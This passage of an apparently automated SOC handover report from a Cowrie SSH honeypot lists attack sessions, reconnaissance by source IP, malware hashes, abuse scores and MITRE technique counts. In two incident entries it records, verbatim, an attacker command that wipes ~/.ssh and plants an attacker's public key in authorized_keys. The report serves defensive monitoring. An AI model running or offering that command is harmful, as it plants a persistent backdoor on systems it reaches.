| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 14:09:32` | `cowrie.session.connect` |
| `2026-06-10 14:09:32` | `cowrie.client.version` |
| `2026-06-10 14:09:33` | `cowrie.client.kex` |
| `2026-06-10 14:09:33` | `cowrie.login.success` |
| `2026-06-10 14:09:33` | `cowrie.session.params` |
| `2026-06-10 14:09:33` | `cowrie.command.input` |
| `2026-06-10 14:09:33` | `cowrie.command.failed` |
| `2026-06-10 14:09:34` | `cowrie.log.closed` |
| `2026-06-10 14:09:34` | `cowrie.session.params` |
| `2026-06-10 14:09:34` | `cowrie.command.input` |
| `2026-06-10 14:09:34` | `cowrie.session.file_download` |
| `2026-06-10 14:09:34` | `cowrie.log.closed` |
| `2026-06-10 14:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f4bbe56fde9

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 14:09 |
| **Last Seen** | 2026-06-10 14:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 14:09:36` | `cowrie.session.connect` |
| `2026-06-10 14:09:36` | `cowrie.client.version` |
| `2026-06-10 14:09:37` | `cowrie.client.kex` |
| `2026-06-10 14:09:37` | `cowrie.login.success` |
| `2026-06-10 14:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-087636db54e9

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 14:11 |
| **Last Seen** | 2026-06-10 14:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 14:11:23` | `cowrie.session.connect` |
| `2026-06-10 14:11:23` | `cowrie.client.version` |
| `2026-06-10 14:11:23` | `cowrie.client.kex` |
| `2026-06-10 14:11:24` | `cowrie.login.success` |
| `2026-06-10 14:11:24` | `cowrie.session.params` |
| `2026-06-10 14:11:24` | `cowrie.command.input` |
| `2026-06-10 14:11:24` | `cowrie.command.failed` |
| `2026-06-10 14:11:25` | `cowrie.log.closed` |
| `2026-06-10 14:11:25` | `cowrie.session.params` |
| `2026-06-10 14:11:25` | `cowrie.command.input` |
| `2026-06-10 14:11:25` | `cowrie.session.file_download` |
| `2026-06-10 14:11:25` | `cowrie.log.closed` |
| `2026-06-10 14:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0ab333afbff

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 14:11 |
| **Last Seen** | 2026-06-10 14:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 14:11:27` | `cowrie.session.connect` |
| `2026-06-10 14:11:27` | `cowrie.client.version` |
| `2026-06-10 14:11:27` | `cowrie.client.kex` |
| `2026-06-10 14:11:28` | `cowrie.login.success` |
| `2026-06-10 14:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb9c1f5f9a22

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 14:14 |
| **Last Seen** | 2026-06-10 14:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 14:14:57` | `cowrie.session.connect` |
| `2026-06-10 14:14:57` | `cowrie.client.version` |
| `2026-06-10 14:14:58` | `cowrie.client.kex` |
| `2026-06-10 14:14:58` | `cowrie.login.success` |
| `2026-06-10 14:14:59` | `cowrie.session.params` |
| `2026-06-10 14:14:59` | `cowrie.command.input` |
| `2026-06-10 14:14:59` | `cowrie.command.failed` |
| `2026-06-10 14:14:59` | `cowrie.log.closed` |
| `2026-06-10 14:14:59` | `cowrie.session.params` |
| `2026-06-10 14:14:59` | `cowrie.command.input` |
| `2026-06-10 14:14:59` | `cowrie.session.file_download` |
| `2026-06-10 14:14:59` | `cowrie.log.closed` |
| `2026-06-10 14:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a863b7b0fe56

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 14:15 |
| **Last Seen** | 2026-06-10 14:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 14:15:01` | `cowrie.session.connect` |
| `2026-06-10 14:15:01` | `cowrie.client.version` |
| `2026-06-10 14:15:02` | `cowrie.client.kex` |
| `2026-06-10 14:15:02` | `cowrie.login.success` |
| `2026-06-10 14:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acab4ac88957

| Field | Detail |
|---|---|
| **Source IP** | `62.201.253[.]23` |
| **First Seen** | 2026-06-10 14:50 |
| **Last Seen** | 2026-06-10 14:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 14:50:42` | `cowrie.session.connect` |
| `2026-06-10 14:50:43` | `cowrie.client.version` |
| `2026-06-10 14:50:43` | `cowrie.client.kex` |
| `2026-06-10 14:50:45` | `cowrie.login.success` |
| `2026-06-10 14:50:46` | `cowrie.direct-tcpip.request` |
| `2026-06-10 14:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.253[.]23` to AbuseIPDB if not already reported
- [ ] Block `62.201.253[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.110.178[.]27` | **204** | 2026-06-10 10:07 | 2026-06-10 15:42 | 175m | 0 | `T1592` | 🟠 MEDIUM |
| `128.199.25[.]179` | **31** | 2026-06-10 10:08 | 2026-06-10 14:57 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `171.25.158[.]57` | **30** | 2026-06-10 13:28 | 2026-06-10 14:27 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `95.167.225[.]76` | **30** | 2026-06-10 10:52 | 2026-06-10 11:48 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `176.65.139[.]254` | **26** | 2026-06-10 10:32 | 2026-06-10 10:35 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.135.43[.]145` | **24** | 2026-06-10 13:17 | 2026-06-10 13:23 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `196.189.237[.]172` | **20** | 2026-06-10 10:09 | 2026-06-10 10:47 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.155[.]86` | **9** | 2026-06-10 13:25 | 2026-06-10 13:55 | 10m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `167.71.225[.]225` | **5** | 2026-06-10 11:28 | 2026-06-10 15:11 | 2m | 0 | `T1592` | 🟢 LOW |
| `18.116.202[.]164` | **3** | 2026-06-10 10:18 | 2026-06-10 10:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.197[.]138` | **2** | 2026-06-10 10:54 | 2026-06-10 10:56 | 4m | 0 | `T1592` | 🟢 LOW |
| `118.145.237[.]236` | **2** | 2026-06-10 13:38 | 2026-06-10 13:40 | 3m | 0 | `T1592` | 🟢 LOW |
| `188.157.143[.]122` | **2** | 2026-06-10 12:41 | 2026-06-10 12:41 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]116` | **2** | 2026-06-10 12:22 | 2026-06-10 12:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.42.41[.]164` | 1 | 2026-06-10 13:34 | 2026-06-10 13:34 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.91.246[.]101` | 1 | 2026-06-10 13:30 | 2026-06-10 13:30 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.108.13[.]168` | 1 | 2026-06-10 11:00 | 2026-06-10 11:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.110.221[.]85` | 1 | 2026-06-10 14:06 | 2026-06-10 14:06 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.224.15[.]67` | 1 | 2026-06-10 12:30 | 2026-06-10 12:30 | 4s | 0 | `T1592` | 🟢 LOW |
| `120.28.196[.]140` | 1 | 2026-06-10 13:14 | 2026-06-10 13:14 | 13s | 0 | `T1592` | 🟢 LOW |
| `120.48.154[.]88` | 1 | 2026-06-10 13:28 | 2026-06-10 13:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.42[.]17` | 1 | 2026-06-10 15:37 | 2026-06-10 15:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.114.8[.]57` | 1 | 2026-06-10 13:21 | 2026-06-10 13:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.185.35[.]6` | 1 | 2026-06-10 12:13 | 2026-06-10 12:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `125.69.76[.]148` | 1 | 2026-06-10 14:50 | 2026-06-10 14:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.59.183[.]60` | 1 | 2026-06-10 11:35 | 2026-06-10 11:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]229` | 1 | 2026-06-10 12:04 | 2026-06-10 12:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]108` | 1 | 2026-06-10 10:10 | 2026-06-10 10:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `149.34.253[.]149` | 1 | 2026-06-10 10:21 | 2026-06-10 10:21 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `174.75.211[.]203` | 1 | 2026-06-10 14:41 | 2026-06-10 14:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.12.109[.]162` | 1 | 2026-06-10 10:37 | 2026-06-10 10:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]229` | 1 | 2026-06-10 10:19 | 2026-06-10 10:19 | 1s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]35` | 1 | 2026-06-10 10:19 | 2026-06-10 10:19 | 1s | 0 | `T1592` | 🟢 LOW |
| `220.179.87[.]204` | 1 | 2026-06-10 10:44 | 2026-06-10 10:44 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.150[.]250` | 1 | 2026-06-10 13:26 | 2026-06-10 13:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.229.34[.]162` | 1 | 2026-06-10 11:58 | 2026-06-10 11:58 | 37s | 0 | `T1592` | 🟢 LOW |
| `58.220.17[.]109` | 1 | 2026-06-10 11:03 | 2026-06-10 11:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.57.154[.]146` | 1 | 2026-06-10 10:44 | 2026-06-10 10:44 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]181` | 1 | 2026-06-10 10:34 | 2026-06-10 10:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `83.139.174[.]109` | 1 | 2026-06-10 14:12 | 2026-06-10 14:12 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.230.168[.]170` | 1 | 2026-06-10 10:16 | 2026-06-10 10:16 | 12s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]171` | 1 | 2026-06-10 10:16 | 2026-06-10 10:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]172` | 1 | 2026-06-10 10:16 | 2026-06-10 10:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]79` | 1 | 2026-06-10 10:16 | 2026-06-10 10:17 | 3s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]128` | 1 | 2026-06-10 14:02 | 2026-06-10 14:02 | 3s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]202` | 1 | 2026-06-10 14:04 | 2026-06-10 14:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]253` | 1 | 2026-06-10 14:02 | 2026-06-10 14:02 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `190.12.109[.]162` | AR | CPS | **100** ⚠️ | 50 |
| `91.230.168[.]171` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `143.110.178[.]27` | IN | DigitalOcean, LLC | **100** ⚠️ | 4 |
| `128.199.25[.]179` | IN | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `58.57.154[.]146` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 50 |
| `116.110.221[.]85` | VN | Viettel Group | **100** ⚠️ | 1 |
| `91.230.168[.]170` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `101.126.155[.]86` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `113.108.13[.]168` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `167.71.225[.]225` | IN | DigitalOcean, LLC | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 224 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 119 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 85 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 30 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 30 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 528 cases |
| Tool 34  | Credential Extractor        | ✅ 204 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 63 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (3.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 39 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 85 priority case(s) shown individually · 47 recon entry/entries in table (14 group(s) consolidating 390 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-10T15:44:07Z_
